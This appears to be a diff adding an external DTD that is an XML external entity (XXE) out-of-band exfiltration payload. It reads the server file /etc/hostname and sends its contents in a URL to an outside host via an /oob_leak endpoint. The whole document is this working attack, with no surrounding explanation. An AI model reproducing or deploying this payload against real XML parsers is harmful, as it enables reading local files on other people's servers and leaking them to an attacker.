@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://34d063.2c0cd1f091d8.qbx72.cfd/oob_leak?d=%file;'>">
+%eval;
+%send;
